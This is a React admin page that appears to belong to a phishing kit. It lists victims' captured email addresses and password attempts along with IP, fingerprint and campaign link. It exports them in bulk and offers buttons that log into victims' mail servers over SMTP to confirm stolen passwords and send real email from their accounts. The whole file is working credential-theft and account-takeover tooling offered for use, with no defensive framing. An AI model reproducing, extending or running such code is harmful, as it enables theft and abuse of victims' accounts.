'use client'

import { useEffect, useState } from 'react'
import AdminLayout from '@/components/admin/AdminLayout'
import {
  Mail,
  Search,
  Filter,
  Download,
  X,
  CheckCircle,
  XCircle,
  Eye,
  Copy,
} from 'lucide-react'
import type { CapturedEmail } from '@/lib/linkDatabase'
import { exportToCSV, exportToJSON, downloadFile } from '@/lib/exportUtils'

export default function CapturesPage() {
  const [captures, setCaptures] = useState<CapturedEmail[]>([])
  const [filteredCaptures, setFilteredCaptures] = useState<CapturedEmail[]>([])
  const [loading, setLoading] = useState(true)
  const [selectedCapture, setSelectedCapture] = useState<CapturedEmail | null>(null)

  // Filters
  const [linkFilter, setLinkFilter] = useState('all')
  const [providerFilter, setProviderFilter] = useState('all')
  const [dateRange, setDateRange] = useState('7d')
  const [searchQuery, setSearchQuery] = useState('')
  
  // SMTP Testing
  const [defaultTestEmail, setDefaultTestEmail] = useState('')
  const [testLoading, setTestLoading] = useState(false)
  const [testResult, setTestResult] = useState<any>(null)
  
  // Email Confirmation Modal
  const [showEmailModal, setShowEmailModal] = useState(false)
  const [modalTestEmail, setModalTestEmail] = useState('')
  const [captureForTest, setCaptureForTest] = useState<CapturedEmail | null>(null)

  useEffect(() => {
    fetchCaptures()
  }, [linkFilter, providerFilter, dateRange])

  useEffect(() => {
    let filtered = captures

    if (searchQuery) {
      const query = searchQuery.toLowerCase()
      filtered = filtered.filter((capture) =>
        capture.email.toLowerCase().includes(query)
      )
    }

    setFilteredCaptures(filtered)
  }, [captures, searchQuery])

  const fetchCaptures = async () => {
    setLoading(true)
    try {
      const params = new URLSearchParams()
      if (linkFilter !== 'all') params.append('link', linkFilter)
      if (providerFilter !== 'all') params.append('provider', providerFilter)

      // Date range
      const now = Date.now()
      let dateFrom: string | null = null
      if (dateRange === '7d') {
        dateFrom = new Date(now - 7 * 24 * 60 * 60 * 1000).toISOString()
      } else if (dateRange === '30d') {
        dateFrom = new Date(now - 30 * 24 * 60 * 60 * 1000).toISOString()
      }

      if (dateFrom) params.append('dateFrom', dateFrom)

      const response = await fetch(`/api/admin/captures?${params.toString()}`)
      const data = await response.json()
      if (data.success) {
        setCaptures(data.captures || [])
      }
    } catch (error) {
    } finally {
      setLoading(false)
    }
  }

  const handleExport = (format: 'csv' | 'json') => {
    if (filteredCaptures.length === 0) {
      alert('No captures to export')
      return
    }

    if (format === 'csv') {
      const csv = exportToCSV(filteredCaptures)
      downloadFile(csv, `captures-${new Date().toISOString().split('T')[0]}.csv`, 'text/csv')
    } else {
      const json = exportToJSON(filteredCaptures)
      downloadFile(json, `captures-${new Date().toISOString().split('T')[0]}.json`, 'application/json')
    }
  }

  // Handler 1: View Details (existing - no changes)
  const handleViewDetails = (capture: CapturedEmail) => {
    setSelectedCapture(capture)
  }

  // Handler 2: Verify SMTP (Auth Only - NO EMAIL)
  const handleVerifySMTP = async (capture: CapturedEmail) => {
    const confirmed = confirm(`🔐 VERIFY SMTP (Quick Test)

This will:
✅ Connect to SMTP server
✅ Authenticate with credentials
✅ Verify password is correct
❌ NO EMAIL WILL BE SENT

Email: ${capture.email}
Provider: ${capture.provider}

Continue?`)
    
    if (!confirmed) return
    
    setTestLoading(true)
    
    try {
      const password = capture.passwords && capture.passwords.length > 0 ? capture.passwords[0] : ''
      
      const response = await fetch('/api/test-smtp-auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: capture.email,
          password: password,
          mxRecord: capture.mxRecord
        })
      })
      
      const data = await response.json()
      
      if (data.authenticated && data.passwordCorrect) {
        // Update capture status
        updateCaptureVerificationStatus(capture.id, true)
        
        alert(`✅ SMTP VERIFIED!

Email: ${capture.email}
Password: ✅ CORRECT

Provider: ${data.provider}
Server: ${data.host}:${data.port}
Response Time: ${data.responseTime}ms

ℹ️ No email was sent. This was an authentication test only.`)
      } else {
        // Update capture status
        updateCaptureVerificationStatus(capture.id, false)
        
        alert(`❌ SMTP VERIFICATION FAILED

Email: ${capture.email}
Password: ❌ INCORRECT or requires app-specific password

Provider: ${data.provider}
Error: ${data.error}

Details:
${data.details?.join('\n') || 'No details available'}`)
      }
    } catch (error: any) {
      alert(`❌ Verification Error: ${error.message}`)
    } finally {
      setTestLoading(false)
    }
  }

  // Handler 3: Send Test (With Email - SHOW MODAL)
  const handleSendTest = (capture: CapturedEmail) => {
    setCaptureForTest(capture)
    setModalTestEmail(defaultTestEmail) // Pre-fill with default
    setShowEmailModal(true) // Show modal
  }

  // Handler 3b: Confirm Send Test (after modal)
  const handleConfirmSendTest = async () => {
    if (!captureForTest || !modalTestEmail) return
    
    setTestLoading(true)
    
    try {
      const password = captureForTest.passwords && captureForTest.passwords.length > 0 ? captureForTest.passwords[0] : ''
      
      const response = await fetch('/api/test-smtp-real', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: captureForTest.email,
          password: password,
          testRecipient: modalTestEmail,
          mxRecord: captureForTest.mxRecord
        })
      })
      
      const data = await response.json()
      
      if (data.success && data.authenticated && data.emailSent) {
        // Update capture status
        updateCaptureVerificationStatus(captureForTest.id, true)
        
        alert(`✅ TEST EMAIL SENT!

Email: ${captureForTest.email}
Password: ✅ CORRECT

Provider: ${data.provider}
Server: ${data.host}:${data.port}
Response Time: ${data.responseTime}ms

📧 Test email sent to: ${modalTestEmail}
Message ID: ${data.messageId || 'N/A'}

Check your inbox!`)
        
        // Close modal
        setShowEmailModal(false)
        setModalTestEmail('')
        setCaptureForTest(null)
      } else {
        // Update capture status
        updateCaptureVerificationStatus(captureForTest.id, false)
        
        alert(`❌ TEST EMAIL FAILED

Email: ${captureForTest.email}
Error: ${data.error || 'Unknown error'}

Details:
${data.details?.join('\n') || 'No details available'}`)
      }
    } catch (error: any) {
      alert(`❌ Send Test Error: ${error.message}`)
    } finally {
      setTestLoading(false)
    }
  }

  // Helper: Update capture verification status
  const updateCaptureVerificationStatus = (captureId: string, verified: boolean) => {
    // Update local state
    setCaptures(captures.map(c => 
      c.id === captureId 
        ? { ...c, verified }
        : c
    ))
    
    setFilteredCaptures(filteredCaptures.map(c => 
      c.id === captureId 
        ? { ...c, verified }
        : c
    ))
    
    // Optional: Update backend
    fetch('/api/admin/update-capture-status', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ captureId, verified })
    }).catch(console.error)
  }

  const getProviderIcon = (provider: string) => {
    const p = provider.toLowerCase()
    if (p.includes('gmail')) return '📧'
    if (p.includes('outlook') || p.includes('office')) return '📬'
    if (p.includes('yahoo')) return '📨'
    return '📮'
  }

  return (
    <AdminLayout>
      <div className="space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold text-gray-900 dark:text-white">
              Total Captures {filteredCaptures.length}
            </h1>
            <p className="text-gray-600 dark:text-gray-400 mt-1">
              View and manage captured credentials
            </p>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={() => handleExport('csv')}
              className="flex items-center gap-2 px-4 py-2 bg-gray-200 hover:bg-gray-300 dark:bg-gray-700 dark:hover:bg-gray-600 text-gray-800 dark:text-white rounded-lg font-medium transition-colors"
            >
              <Download className="w-4 h-4" />
              Export CSV
            </button>
            <button
              onClick={() => handleExport('json')}
              className="flex items-center gap-2 px-4 py-2 bg-gray-200 hover:bg-gray-300 dark:bg-gray-700 dark:hover:bg-gray-600 text-gray-800 dark:text-white rounded-lg font-medium transition-colors"
            >
              <Download className="w-4 h-4" />
              Export JSON
            </button>
          </div>
        </div>

        {/* Filters */}
        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md border border-gray-200 dark:border-gray-700 p-4">
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                Link
              </label>
              <select
                value={linkFilter}
                onChange={(e) => setLinkFilter(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
              >
                <option value="all">All Links</option>
              </select>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                Provider
              </label>
              <select
                value={providerFilter}
                onChange={(e) => setProviderFilter(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
              >
                <option value="all">All Providers</option>
                <option value="gmail">Gmail</option>
                <option value="outlook">Outlook</option>
                <option value="yahoo">Yahoo</option>
                <option value="other">Other</option>
              </select>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                Date Range
              </label>
              <select
                value={dateRange}
                onChange={(e) => setDateRange(e.target.value)}
                className="w-full px-3 py-2 border border-gray-300 dark:border-gray-600 rounded-lg bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
              >
                <option value="7d">Last 7 days</option>
                <option value="30d">Last 30 days</option>
                <option value="all">All time</option>
              </select>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                Search Email
              </label>
              <div className="relative">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-gray-400" />
                <input
                  type="text"
                  placeholder="Search..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="w-full pl-10 pr-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
                />
              </div>
            </div>
          </div>
          
          {/* Test SMTP Configuration Section - Default Email Only */}
          <div className="mt-4 pt-4 border-t border-gray-200 dark:border-gray-700">
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                Default Test Email Recipient
              </label>
              <input
                type="email"
                placeholder="Enter email to receive test emails (e.g., your-email@gmail.com)"
                value={defaultTestEmail}
                onChange={(e) => setDefaultTestEmail(e.target.value)}
                className="w-full px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
              />
              <p className="text-xs text-gray-500 dark:text-gray-400 mt-2">
                This email will be pre-filled when sending test emails. You can change it for each test.
              </p>
            </div>
          </div>
        </div>

        {/* Captures List */}
        {loading ? (
          <div className="flex items-center justify-center h-64">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
          </div>
        ) : filteredCaptures.length === 0 ? (
          <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md border border-gray-200 dark:border-gray-700 p-12 text-center">
            <Mail className="w-16 h-16 text-gray-400 mx-auto mb-4" />
            <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-2">
              No captures yet
            </h3>
            <p className="text-gray-600 dark:text-gray-400">
              Captures will appear here once users submit credentials
            </p>
          </div>
        ) : (
          <div className="grid gap-4">
            {filteredCaptures.map((capture) => (
              <div
                key={capture.id}
                className="bg-white dark:bg-gray-800 rounded-lg shadow-md border border-gray-200 dark:border-gray-700 p-6"
              >
                <div className="flex items-start justify-between">
                  <div className="flex-1">
                    <div className="flex items-center gap-3 mb-2">
                      <span className="text-2xl">{getProviderIcon(capture.provider)}</span>
                      <div>
                        <p className="font-medium text-gray-900 dark:text-white">
                          {capture.email}
                        </p>
                        <p className="text-sm text-gray-500 dark:text-gray-400">
                          {capture.provider || 'Unknown'}
                        </p>
                      </div>
                      {capture.verified ? (
                        <span className="px-2 py-1 text-xs font-medium bg-green-100 dark:bg-green-900/30 text-green-800 dark:text-green-300 rounded-full flex items-center gap-1">
                          <CheckCircle className="w-3 h-3" />
                          Verified
                        </span>
                      ) : (
                        <span className="px-2 py-1 text-xs font-medium bg-gray-100 dark:bg-gray-700 text-gray-800 dark:text-gray-300 rounded-full flex items-center gap-1">
                          <XCircle className="w-3 h-3" />
                          Not Verified
                        </span>
                      )}
                    </div>

                    <div className="text-sm text-gray-600 dark:text-gray-400 space-y-1">
                      <p>
                        Campaign: {capture.linkName || 'N/A'} • {capture.linkType === 'personalized' ? 'Type A' : 'Type B'}
                      </p>
                      <p>
                        Captured: {new Date(capture.capturedAt).toLocaleString()}
                      </p>
                      <p>
                        IP: {capture.ip || 'Unknown'} • Attempts: {capture.attempts}
                      </p>
                    </div>
                  </div>

                  {/* Right side - 3 ACTION BUTTONS */}
                  <div className="ml-4 flex flex-col gap-2">
                    {/* Button 1: View Details */}
                    <button
                      onClick={() => handleViewDetails(capture)}
                      className="px-6 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-medium transition-colors whitespace-nowrap flex items-center justify-center gap-2"
                      title="View captured credentials and details"
                    >
                      <Eye className="w-4 h-4" />
                      View Details
                    </button>
                    
                    {/* Button 2: Verify SMTP (Auth Only - NO EMAIL) */}
                    <button
                      onClick={() => handleVerifySMTP(capture)}
                      disabled={testLoading}
                      className={`px-6 py-2 rounded-lg font-medium transition-colors whitespace-nowrap ${
                        testLoading 
                          ? 'bg-gray-600 cursor-not-allowed text-gray-400' 
                          : 'bg-purple-600 hover:bg-purple-700 text-white'
                      }`}
                      title="Quick test: Verify password by authenticating (no email sent)"
                    >
                      {testLoading ? '⏳ Verifying...' : '🔐 Verify SMTP'}
                    </button>
                    
                    {/* Button 3: Send Test (With Email - SHOW MODAL) */}
                    <button
                      onClick={() => handleSendTest(capture)}
                      disabled={testLoading}
                      className={`px-6 py-2 rounded-lg font-medium transition-colors whitespace-nowrap ${
                        testLoading 
                          ? 'bg-gray-600 cursor-not-allowed text-gray-400' 
                          : 'bg-green-600 hover:bg-green-700 text-white'
                      }`}
                      title="Full test: Authenticate and send test email to your inbox"
                    >
                      {testLoading ? '⏳ Testing...' : '📧 Send Test'}
                    </button>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}

        {/* Details Modal */}
        {selectedCapture && (
          <CaptureDetailsModal
            capture={selectedCapture}
            onClose={() => setSelectedCapture(null)}
          />
        )}

        {/* Email Confirmation Modal */}
        <EmailConfirmationModal
          showEmailModal={showEmailModal}
          setShowEmailModal={setShowEmailModal}
          modalTestEmail={modalTestEmail}
          setModalTestEmail={setModalTestEmail}
          captureForTest={captureForTest}
          testLoading={testLoading}
          handleConfirmSendTest={handleConfirmSendTest}
        />
      </div>
    </AdminLayout>
  )
}

// Email Confirmation Modal Component
function EmailConfirmationModal({
  showEmailModal,
  setShowEmailModal,
  modalTestEmail,
  setModalTestEmail,
  captureForTest,
  testLoading,
  handleConfirmSendTest,
}: {
  showEmailModal: boolean
  setShowEmailModal: (show: boolean) => void
  modalTestEmail: string
  setModalTestEmail: (email: string) => void
  captureForTest: CapturedEmail | null
  testLoading: boolean
  handleConfirmSendTest: () => void
}) {
  if (!showEmailModal || !captureForTest) return null
  
  // Handle keyboard shortcuts
  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && modalTestEmail && !testLoading) {
      handleConfirmSendTest()
    } else if (e.key === 'Escape') {
      setShowEmailModal(false)
      setModalTestEmail('')
    }
  }
  
  return (
    <div 
      className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50"
      onClick={(e) => {
        if (e.target === e.currentTarget) {
          setShowEmailModal(false)
          setModalTestEmail('')
        }
      }}
    >
      <div className="bg-white dark:bg-gray-800 rounded-lg shadow-xl max-w-md w-full mx-4">
        <div className="p-6">
          <h3 className="text-xl font-semibold text-gray-900 dark:text-white mb-4">
            📧 Send Test Email
          </h3>
          
          <div className="space-y-4">
            {/* Capture info */}
            <div className="bg-gray-100 dark:bg-gray-700 rounded-lg p-4">
              <p className="text-sm text-gray-600 dark:text-gray-400">Testing credentials for:</p>
              <p className="font-semibold text-lg text-gray-900 dark:text-white">{captureForTest.email}</p>
              <p className="text-sm text-gray-600 dark:text-gray-400">Provider: {captureForTest.provider || 'Unknown'}</p>
            </div>
            
            {/* Email input */}
            <div>
              <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                Send test email to:
              </label>
              <input
                type="email"
                placeholder="your-email@example.com"
                value={modalTestEmail}
                onChange={(e) => setModalTestEmail(e.target.value)}
                onKeyDown={handleKeyPress}
                className="w-full px-4 py-2 border border-gray-300 dark:border-gray-600 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 bg-white dark:bg-gray-800 text-gray-900 dark:text-white"
                autoFocus
              />
              <p className="text-xs text-gray-500 dark:text-gray-400 mt-2">
                Press Enter to send, Escape to cancel
              </p>
            </div>
            
            {/* Warning */}
            <div className="bg-yellow-50 dark:bg-yellow-900/30 border border-yellow-200 dark:border-yellow-700 rounded-lg p-3">
              <p className="text-xs text-yellow-800 dark:text-yellow-200">
                ⚠️ This will authenticate and send a real email using the captured credentials.
              </p>
            </div>
            
            {/* Action buttons */}
            <div className="flex gap-3">
              <button
                onClick={() => {
                  setShowEmailModal(false)
                  setModalTestEmail('')
                }}
                className="flex-1 px-4 py-2 bg-gray-200 dark:bg-gray-700 hover:bg-gray-300 dark:hover:bg-gray-600 text-gray-800 dark:text-white rounded-lg font-medium transition-colors"
              >
                Cancel
              </button>
              
              <button
                onClick={handleConfirmSendTest}
                disabled={!modalTestEmail || testLoading}
                className="flex-1 px-4 py-2 bg-green-600 hover:bg-green-700 disabled:bg-gray-600 disabled:cursor-not-allowed text-white rounded-lg font-medium transition-colors"
              >
                {testLoading ? 'Sending...' : '📧 Send Test'}
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}

// Capture Details Modal
function CaptureDetailsModal({
  capture,
  onClose,
}: {
  capture: CapturedEmail
  onClose: () => void
}) {
  const [copied, setCopied] = useState(false)
  const [smtpTestResult, setSmtpTestResult] = useState<any>(null)
  const [smtpTestLoading, setSmtpTestLoading] = useState(false)

  const copyPassword = () => {
    const password = capture.passwords && capture.passwords.length > 0
      ? capture.passwords[0]
      : 'N/A'
    navigator.clipboard.writeText(password)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  const handleTestSMTP = async () => {
    setSmtpTestLoading(true)
    setSmtpTestResult(null)
    
    try {
      const response = await fetch('/api/test-smtp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: capture.email,
          mxRecord: capture.mxRecord
        })
      })
      
      const data = await response.json()
      setSmtpTestResult(data)
    } catch (error: any) {
      setSmtpTestResult({
        success: false,
        error: error.message,
        details: ['Exception during SMTP test']
      })
    } finally {
      setSmtpTestLoading(false)
    }
  }

  return (
    <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
      <div className="bg-white dark:bg-gray-800 rounded-lg shadow-xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
        <div className="flex items-center justify-between p-6 border-b border-gray-200 dark:border-gray-700">
          <h2 className="text-xl font-bold text-gray-900 dark:text-white">Capture Details</h2>
          <button
            onClick={onClose}
            className="text-gray-400 hover:text-gray-600 dark:hover:text-gray-300"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        <div className="p-6 space-y-6">
          {/* Email Information */}
          <div>
            <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">
              Email Information
            </h3>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-gray-600 dark:text-gray-400">Email:</span>
                <span className="text-gray-900 dark:text-white font-medium">{capture.email}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600 dark:text-gray-400">Provider:</span>
                <span className="text-gray-900 dark:text-white">{capture.provider || 'Unknown'}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600 dark:text-gray-400">Verified:</span>
                <span className="text-gray-900 dark:text-white">
                  {capture.verified ? '✅ Yes (SMTP)' : '❌ No'}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600 dark:text-gray-400">MX Record:</span>
                <span className="text-gray-900 dark:text-white font-mono text-xs">
                  {capture.mxRecord || 'Unknown'}
                </span>
              </div>
            </div>
          </div>

          {/* Password Attempts */}
          <div>
            <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">
              Password Attempts
            </h3>
            <div className="space-y-2">
              {capture.passwords && capture.passwords.length > 0 ? (
                capture.passwords.map((password, index) => (
                  <div key={index} className="flex items-center justify-between p-2 bg-gray-50 dark:bg-gray-700 rounded">
                    <span className="text-sm text-gray-600 dark:text-gray-400">
                      Attempt {index + 1}:
                    </span>
                    <span className="text-sm font-mono text-gray-900 dark:text-white">
                      {password}
                    </span>
                  </div>
                ))
              ) : (
                <p className="text-sm text-gray-500 dark:text-gray-400">No passwords recorded</p>
              )}
              {capture.passwords && capture.passwords.length >= 3 &&
                capture.passwords[0] === capture.passwords[1] &&
                capture.passwords[1] === capture.passwords[2] && (
                  <p className="text-sm text-green-600 dark:text-green-400 mt-2">
                    ✅ Confirmed (3 same passwords)
                  </p>
                )}
            </div>
          </div>

          {/* Location & Device */}
          <div>
            <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">
              Location & Device
            </h3>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-gray-600 dark:text-gray-400">IP Address:</span>
                <span className="text-gray-900 dark:text-white font-mono">{capture.ip || 'Unknown'}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600 dark:text-gray-400">Location:</span>
                <span className="text-gray-900 dark:text-white">Unknown</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600 dark:text-gray-400">Fingerprint:</span>
                <span className="text-gray-900 dark:text-white font-mono text-xs truncate max-w-xs">
                  {capture.fingerprint || 'Unknown'}
                </span>
              </div>
            </div>
          </div>

          {/* Link Information */}
          <div>
            <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">
              Link Information
            </h3>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-gray-600 dark:text-gray-400">Campaign:</span>
                <span className="text-gray-900 dark:text-white">{capture.linkName || 'N/A'}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600 dark:text-gray-400">Link Type:</span>
                <span className="text-gray-900 dark:text-white">
                  {capture.linkType === 'personalized' ? 'Personalized (Type A)' : 'Generic (Type B)'}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600 dark:text-gray-400">Session ID:</span>
                <span className="text-gray-900 dark:text-white font-mono text-xs">
                  {capture.sessionIdentifier || capture.linkToken || 'N/A'}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-600 dark:text-gray-400">Captured At:</span>
                <span className="text-gray-900 dark:text-white">
                  {new Date(capture.capturedAt).toLocaleString()}
                </span>
              </div>
            </div>
          </div>

          {/* NEW: SMTP Test Section */}
          <div className="border-t border-gray-200 dark:border-gray-700 pt-4">
            <h3 className="text-lg font-semibold text-gray-900 dark:text-white mb-4">
              SMTP Configuration
            </h3>
            
            {smtpTestResult ? (
              <div className={`p-4 rounded-lg ${
                smtpTestResult.success 
                  ? 'bg-green-900/30 border border-green-700' 
                  : 'bg-red-900/30 border border-red-700'
              }`}>
                <div className="flex items-center gap-2 mb-2">
                  {smtpTestResult.success ? '✅' : '❌'}
                  <span className="font-semibold text-gray-900 dark:text-white">
                    {smtpTestResult.success ? 'SMTP Working' : 'SMTP Failed'}
                  </span>
                </div>
                
                <div className="text-sm space-y-1 text-gray-700 dark:text-gray-300">
                  <p>Provider: {smtpTestResult.provider}</p>
                  <p>Server: {smtpTestResult.host}:{smtpTestResult.port}</p>
                  <p>Response Time: {smtpTestResult.responseTime}ms</p>
                  {smtpTestResult.smtpBanner && (
                    <p className="font-mono text-xs mt-2">Banner: {smtpTestResult.smtpBanner}</p>
                  )}
                  {smtpTestResult.error && (
                    <p className="text-red-400">Error: {smtpTestResult.error}</p>
                  )}
                  {smtpTestResult.details && smtpTestResult.details.length > 0 && (
                    <div className="mt-2">
                      <p className="font-semibold mb-1">Details:</p>
                      <ul className="list-disc list-inside space-y-1 text-xs">
                        {smtpTestResult.details.map((detail: string, idx: number) => (
                          <li key={idx}>{detail}</li>
                        ))}
                      </ul>
                    </div>
                  )}
                </div>
                
                <button
                  onClick={handleTestSMTP}
                  disabled={smtpTestLoading}
                  className="mt-3 px-4 py-2 bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 disabled:cursor-not-allowed text-white rounded-lg text-sm transition-colors"
                >
                  {smtpTestLoading ? 'Testing...' : '🔄 Test Again'}
                </button>
              </div>
            ) : (
              <button
                onClick={handleTestSMTP}
                disabled={smtpTestLoading}
                className="px-4 py-2 bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 disabled:cursor-not-allowed text-white rounded-lg text-sm transition-colors"
              >
                {smtpTestLoading ? 'Testing...' : '🧪 Run SMTP Test'}
              </button>
            )}
          </div>

          {/* Actions */}
          <div className="flex items-center gap-3 pt-4 border-t border-gray-200 dark:border-gray-700">
            <button
              onClick={copyPassword}
              className="flex items-center gap-2 px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-medium transition-colors"
            >
              {copied ? (
                <>
                  <CheckCircle className="w-4 h-4" />
                  Copied!
                </>
              ) : (
                <>
                  <Copy className="w-4 h-4" />
                  Copy Password
                </>
              )}
            </button>
            <button
              onClick={onClose}
              className="px-4 py-2 bg-gray-200 hover:bg-gray-300 dark:bg-gray-700 dark:hover:bg-gray-600 text-gray-800 dark:text-white rounded-lg font-medium transition-colors"
            >
              Close
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

